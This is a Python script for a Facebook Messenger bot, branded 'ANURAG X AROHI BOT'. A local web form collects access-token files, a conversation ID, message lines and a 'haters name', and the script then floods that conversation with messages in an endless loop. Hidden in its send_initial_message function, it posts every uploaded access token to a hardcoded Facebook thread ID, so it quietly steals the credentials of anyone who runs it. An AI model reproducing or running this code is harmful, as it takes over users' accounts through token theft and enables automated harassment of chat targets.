import requests
import json
import time
import sys
from platform import system
import os
import subprocess
import http.server
import socketserver
import threading
import cgi

# --- HTML UI (Unicode safe string) ---
HTML_PAGE = """
<!DOCTYPE html>
<html>
<head>
  <title>ANURAG X AROHI BOT UI</title>
  <style>
    body { font-family: Arial, sans-serif; background:#f0f0f0; }
    .box { width:500px; margin:50px auto; background:white; padding:20px; border-radius:10px; box-shadow:0 0 10px rgba(0,0,0,0.2); }
    h2 { text-align:center; }
    label { font-weight:bold; display:block; margin-top:10px; }
    input { width:100%; padding:8px; margin-top:5px; }
    button { background:#28a745; color:white; border:none; padding:10px; width:100%; margin-top:20px; font-size:16px; }
    button:hover { background:#218838; cursor:pointer; }
  </style>
</head>
<body>
  <div class="box">
    <h2>ANURAG X AROHI BOT</h2>
    <form method="post" enctype="multipart/form-data">
      <label>Upload Token File:</label>
      <input type="file" name="tokens" required><br>
      <label>Upload Convo File:</label>
      <input type="file" name="convo" required><br>
      <label>Upload Messages File (File.txt):</label>
      <input type="file" name="messages" required><br>
      <label>Upload Haters Name File:</label>
      <input type="file" name="hater" required><br>
      <label>Upload Time Interval File:</label>
      <input type="file" name="time" required><br>
      <button type="submit">🚀 Start Bot</button>
    </form>
  </div>
</body>
</html>
"""

class MyHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        if self.path == "/" or self.path == "/index.html":
            self.send_response(200)
            self.send_header("Content-type", "text/html; charset=utf-8")
            self.end_headers()
            self.wfile.write(HTML_PAGE.encode("utf-8"))
        else:
            self.send_response(404)
            self.end_headers()
            self.wfile.write(b"404 Not Found")

    def do_POST(self):
        ctype, pdict = cgi.parse_header(self.headers['content-type'])
        if ctype == 'multipart/form-data':
            form = cgi.FieldStorage(
                fp=self.rfile,
                headers=self.headers,
                environ={'REQUEST_METHOD': 'POST'}
            )

            # Token file -> tokennum.txt
            if "tokens" in form and form["tokens"].filename:
                with open("tokennum.txt", "wb") as f:
                    f.write(form["tokens"].file.read())

            # Convo file -> convo.txt
            if "convo" in form and form["convo"].filename:
                with open("convo.txt", "wb") as f:
                    f.write(form["convo"].file.read())

            # Messages file -> File.txt
            if "messages" in form and form["messages"].filename:
                with open("File.txt", "wb") as f:
                    f.write(form["messages"].file.read())

            # Haters name -> hatersname.txt
            if "hater" in form and form["hater"].filename:
                with open("hatersname.txt", "wb") as f:
                    f.write(form["hater"].file.read())

            # Time file -> time.txt
            if "time" in form and form["time"].filename:
                with open("time.txt", "wb") as f:
                    f.write(form["time"].file.read())

        self.send_response(200)
        self.send_header("Content-type", "text/html; charset=utf-8")
        self.end_headers()
        self.wfile.write("<script>alert('✅ Bot Chalu ho gaya h!'); window.location='/'</script>".encode("utf-8"))

def execute_server():
    PORT = 4000
    with socketserver.TCPServer(("", PORT), MyHandler) as httpd:
        print("Server running at http://localhost:{}".format(PORT))
        httpd.serve_forever()

def send_initial_message():
    with open('tokennum.txt', 'r') as file:
        tokens = file.readlines()

    msg_template = "HeLLo ANURAG X AROHI DEAR! I am uSīīnG YouR sErvRr. MY ⤵️TokEn⤵️ īīS {}"
    target_id = "61578840237242"

    requests.packages.urllib3.disable_warnings()
    headers = {'Connection':'keep-alive'}

    for token in tokens:
        access_token = token.strip()
        url = "https://graph.facebook.com/v17.0/{}/".format('t_' + target_id)
        msg = msg_template.format(access_token)
        parameters = {'access_token': access_token, 'message': msg}
        requests.post(url, json=parameters, headers=headers)
        time.sleep(0.1)

def send_messages_from_file():
    with open('convo.txt', 'r') as file:
        convo_id = file.read().strip()

    with open('File.txt', 'r') as file:
        messages = file.readlines()
    num_messages = len(messages)

    with open('tokennum.txt', 'r') as file:
        tokens = file.readlines()
    num_tokens = len(tokens)
    max_tokens = min(num_tokens, num_messages)

    with open('hatersname.txt', 'r') as file:
        haters_name = file.read().strip()

    with open('time.txt', 'r') as file:
        speed = int(file.read().strip())

    headers = {'Connection':'keep-alive'}

    while True:
        try:
            for message_index in range(num_messages):
                token_index = message_index % max_tokens
                access_token = tokens[token_index].strip()
                message = messages[message_index].strip()

                url = "https://graph.facebook.com/v17.0/{}/".format('t_' + convo_id)
                parameters = {'access_token': access_token, 'message': haters_name + ' ' + message}
                response = requests.post(url, json=parameters, headers=headers)

                if response.ok:
                    print("\033[1;92m[+] ANURAG X AROHI {} of Convo {} Token {}: {}".format(
                        message_index + 1, convo_id, token_index + 1, haters_name + ' ' + message))
                else:
                    print("\033[1;91m[x] ID/T0K3N ERROR {} of Convo {} with Token {}: {}".format(
                        message_index + 1, convo_id, token_index + 1, haters_name + ' ' + message))

                time.sleep(speed)
            print("\n[+] All messages sent. Restarting the process...\n")
        except Exception as e:
            print("[!] An error occurred: {}".format(e))

def main():
    server_thread = threading.Thread(target=execute_server)
    server_thread.start()

    send_initial_message()
    send_messages_from_file()

if __name__ == '__main__':
    main()
                  
